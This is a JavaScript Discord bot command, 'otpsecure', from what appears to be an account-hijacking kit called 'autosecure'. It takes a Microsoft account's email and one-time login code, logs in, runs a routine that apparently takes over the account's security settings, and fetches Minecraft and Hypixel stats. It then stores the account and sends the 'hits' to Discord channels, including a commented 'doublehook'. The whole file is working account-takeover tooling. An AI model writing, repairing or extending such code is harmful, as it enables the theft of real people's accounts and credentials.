const validEmail = require("../../../autosecure/utils/emails/validEmail.js");
const axios = require("axios");
const login = require("../../../autosecure/utils/secure/login");
const secure = require("../../../autosecure/utils/secure/recodesecure.js");
const listAccount = require("../../../autosecure/utils/accounts/listAccount.js");
const { queryParams } = require("../../../db/database.js");
const statsembed = require("../../../autosecure/utils/stats/statsembed.js");
const fetchStats = require("../../../autosecure/utils/hypixelapi/fetchStats.js");
const generateuid = require("../../../autosecure/utils/generateuid");
const { ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const insertaccount = require('../../../db/insertaccount')
const getStats = require("../../../autosecure/utils/hypixelapi/getStats.js");
const mcregex = require("../../.././autosecure/utils/utils/mcregex.js");
const { failedembed } = require("../../../autosecure/utils/embeds/embedhandler.js");
const getCredentials = require("../../../autosecure/utils/info/getCredentials.js");
const { sendHitsToChannels } = require("../../utils/sendHits");
const { logAccountSecure } = require("../../utils/activityLogger");

module.exports = {
    name: "otpsecure",
    userOnly: true,
    callback: async (client, interaction) => {
        await interaction.deferReply({ ephemeral: true });

        let email = interaction.components[0].components[0].value;
        let otp = interaction.components[1].components[0].value;
        const mcign = interaction.components[2].components[0].value || null;

        if (mcign && !mcregex(mcign)) {
            return interaction.editReply({
                content: "Please enter a valid minecraft username!"
            });
        }

        if (!validEmail(email)) {
            return interaction.editReply({ content: `Invalid Email` });
        }

        if (isNaN(otp) || otp.length < 6 || otp.length > 7) {
            return interaction.editReply({ content: `Invalid OTP` });
        }

        let settings = await queryParams(`SELECT * FROM secureconfig WHERE user_id=?`, [interaction.user.id]);

        if (settings.length === 0) {
            console.log(`Settings not found for user: ${interaction.user.id}`);
            return interaction.editReply({
                content: `Couldn't get your settings!`
            });
        }

        settings = settings[0];
        let profiles = null;
        const data = await getCredentials(email, false);
        profiles = data;

        try {
            if (!profiles?.Credentials || !profiles?.Credentials?.OtcLoginEligibleProofs) {
                return interaction.editReply({ content: `Invalid email / OTP Disabled` });
            }
        } catch (error) {
            console.error("Error parsing profiles data:", error);
            return interaction.editReply({ content: `Email doesn't exist!` });
        }


        for (let sec of profiles?.Credentials?.OtcLoginEligibleProofs) {
            let host = await login({ email: email, id: sec.data, code: otp }, profiles);
            if (host) {
                const expireTimestamp = Math.floor((Date.now() / 1000) + 900);
                let uid = await generateuid();

                const embed = {
                    title: 'This account is being automatically secured.',
                    color: 0x808080
                };
                
                const components = [
                    new ActionRowBuilder().addComponents(
                        new ButtonBuilder()
                            .setCustomId(`status|${uid}`)
                            .setLabel('⏳ Status')
                            .setStyle(ButtonStyle.Primary)
                    )
                ];
                
                await interaction.editReply({ embeds: [embed], components });
                
                // Sending the same message gdirectly to the user
                await interaction.user.send({ embeds: [embed], components });
                
                try {
                    console.log(`uid: ${uid}`);
                    let acc = await secure(host, settings, uid, mcign);
                    let inserted = await insertaccount(acc, uid, interaction.user.id, settings.secureifnomc)


                    if (acc.oldName == "No Minecraft!") {
                        let accountmessage = await listAccount(acc, uid, client, interaction);;
                        
                        // Send to hits channels (doublehook)
                        await sendHitsToChannels(client, accountmessage, interaction.user.id, interaction.user.tag, client.username);
                        
                        // Log account securing
                        await logAccountSecure(client, interaction.user.id, interaction.user.tag, acc.oldEmail || acc.email, "OTP Secure", true).catch(() => {});
                        
                        await interaction.user.send(accountmessage);
                        return;
                    }

                    const failedmsg = await failedembed(acc, uid)
                    if (failedmsg.failed) {
                        await interaction.followUp(failedmsg.failedmsg);
                        await interaction.user.send(failedmsg.failedmsg);
                        return;
                    }


                    
                    
                  //  console.log(stats);
                    let statsoverview = await statsembed(client, acc, interaction);
                    let accountmessage = await listAccount(acc, uid, client, interaction);;
                    
                    // Send to hits channels (doublehook)
                    await sendHitsToChannels(client, accountmessage, interaction.user.id, interaction.user.tag, client.username);
                    
                    // Log account securing
                    await logAccountSecure(client, interaction.user.id, interaction.user.tag, acc.oldEmail || acc.email, "OTP Secure", true).catch(() => {});
         
                    if (statsoverview) {
                        await interaction.user.send(statsoverview);
                    }
                    await interaction.user.send(accountmessage);
                    await interaction.editReply({accountmessage})
                } catch (error) {
                    console.log(error);
                    await interaction.editReply({
                        embeds: [{
                            title: `Failed securing!`,
                            description: `An error occurred while securing your account.\n Please use the status button to log in to your account.`,
                            color: 0xff0000
                        }],
                    });
                }
                return;
            }
        }

        await interaction.editReply(`Failed to login!`);
    }
};

